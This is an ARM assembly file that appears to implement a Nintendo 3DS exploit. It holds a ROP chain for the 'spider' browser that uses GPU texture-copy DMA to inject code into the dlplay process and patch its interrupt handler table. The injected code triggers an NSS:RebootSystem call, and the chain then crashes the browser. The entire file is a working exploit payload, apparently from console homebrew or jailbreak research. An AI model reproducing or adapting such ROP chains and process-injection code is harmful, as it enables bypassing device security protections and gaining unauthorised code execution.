	.arm
	.text

#include "spider_rop.h"

#define BUFFER_SIZE			0x00000200

	.global	_start
spiderRop:
	@copy code to dlplay
		@copy patch
			.word POP_R0_1_2_3_4_PC, SPIDER_GSPHEAPBUF, SPIDER_ROP_LOC+dlplayCode, dlplayCode_end-dlplayCode, GARBAGE, GARBAGE @ r0=dst, r1=src, r2=size
			.word MEMCPY_LDMFD_SP_R4_5_6_7_8_10_LR @ shared with gxCommand copy code stub to end of dlplay .text
gxCommand:
			.word GX_SetTextureCopy, SPIDER_GSPHEAPBUF, DLPLAY_CODE_LOC, BUFFER_SIZE, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008

		@flush data cache
			.word POP_R0_1_2_3_4_PC, HANDLE_PTR, KPROCESS_HANDLE, SPIDER_GSPHEAPBUF, BUFFER_SIZE, GARBAGE @ shared with gxCommand[8]
			.word POP_LR_PC, POP_PC
			.word GSPGPU_FlushDataCache

		@send GX command
			.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58
			.word POP_R1_PC, SPIDER_ROP_LOC+gxCommand
			.word POP_LR_PC, POP_PC @ lr (pop pc)
			.word nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue

		@sleep for a bit
			.word POP_R0_PC, 500000000 @ r0 (half second)
			.word POP_R1_PC, 0x00000000 @ r1 (nothing)
			.word POP_LR_PC, POP_PC @ lr (pop pc)
			.word SVC_0A_BX_LR

	@copy gsp interrupt handler table to linear heap
		@flush data cache
			.word POP_R0_1_2_3_4_PC, HANDLE_PTR, KPROCESS_HANDLE, SPIDER_GSPHEAPBUF, BUFFER_SIZE, GARBAGE
			.word POP_LR_PC, POP_PC
			.word GSPGPU_FlushDataCache

		@send GX command
			.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58
			.word POP_R1_PC, SPIDER_ROP_LOC+gxCommand2
			.word POP_LR_PC, POP_PC @ lr (pop pc)
			.word nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue

		@sleep for a bit
			.word POP_R0_PC, 500000000 @ r0 (half second)
			.word POP_R1_PC, 0x00000000 @ r1 (nothing)
			.word POP_LR_PC, POP_PC @ lr (pop pc)
			.word SVC_0A_BX_LR

		@ needed for ROP
			.word POP_R0_PC, SPIDER_ROP_LOC+0x8C @ r0 InitData 1

	@copy gsp interrupt handler table back to dlplay after patching it
		@patch table
			.word POP_R0_1_2_3_4_PC, SPIDER_GSPHEAPBUF+0x90, SPIDER_ROP_LOC+dlplayHook, dlplayHook_end - dlplayHook, GARBAGE, GARBAGE @ r0=dst, r1=src, r2=size
			.word MEMCPY_LDMFD_SP_R4_5_6_7_8_10_LR @ shared with gxCommand3 copy gsp interrupt handler ptr table back to dplay for spider linear heap
gxCommand3:
			.word GX_SetTextureCopy, SPIDER_GSPHEAPBUF, DLPLAY_HOOK_LOC, BUFFER_SIZE, 0xFFFFFFFF, SPIDER_ROP_LOC, 0x00000008 @ shared with InitData 2

			.word POP_PC @ InitData 4 shared with gcXommand3[8]

		@flush data cache
			.word POP_R0_1_2_3_4_PC, HANDLE_PTR, KPROCESS_HANDLE, SPIDER_GSPHEAPBUF, BUFFER_SIZE, GARBAGE
			.word POP_LR_PC, POP_PC
			.word GSPGPU_FlushDataCache

		@send GX command
			.word POP_R0_PC, nn__gxlow__CTR__detail__GetInterruptReceiver+0x58 @ shared with InitData 5,6
			.word POP_R1_PC, SPIDER_ROP_LOC+gxCommand3
			.word POP_LR_PC, POP_PC @ lr (pop pc)
			.word nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue

		@trigger spider crash to return to menu
			.word 0xFFFFFFFF

	dlplayCode:
		ldr r0, =DLPLAY_NSSHANDLE_LOC_VA @ ns:s handle location
		ldr r0, [r0]

		mrc p15, 0, r1, c13, c0, 3
		add r1, #0x80
		ldr r2, =0x00100180 @ NSS:RebootSystem
		str r2, [r1], #4
		ldr r2, =0x00000001 @ flag
		str r2, [r1], #4
		ldr r2, =0x00000000 @ lower word PID (0 for gamecard)
		str r2, [r1], #4
		ldr r2, =0x00000000 @ upper word PID
		str r2, [r1], #4
		ldr r2, =0x00000002 @ mediatype (2 for gamecard)
		str r2, [r1], #4
		ldr r2, =0x00000000 @ reserved
		str r2, [r1], #4
		ldr r2, =0x00000000 @ flag
		str r2, [r1], #4

		.word 0xef000032 @ svc 0x32 (sendsyncrequest)

		@sleep forever and ever...
		ldr r0, =0xFFFFFFFF
		ldr r1, =0x0FFFFFFF
		.word 0xef00000a @ svc 0xa (sleep)

		.pool
	dlplayCode_end:
	dlplayHook:
		.fill 6, 4, DLPLAY_CODE_LOC_VA
	dlplayHook_end:
	gxCommand2:
	@ copy gsp interrupt handler ptr table to spider linear heap
		.word GX_SetTextureCopy, DLPLAY_HOOK_LOC, SPIDER_GSPHEAPBUF, BUFFER_SIZE, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000008, GARBAGE

		.fill 3, 4, GARBAGE
		.word MAGIC
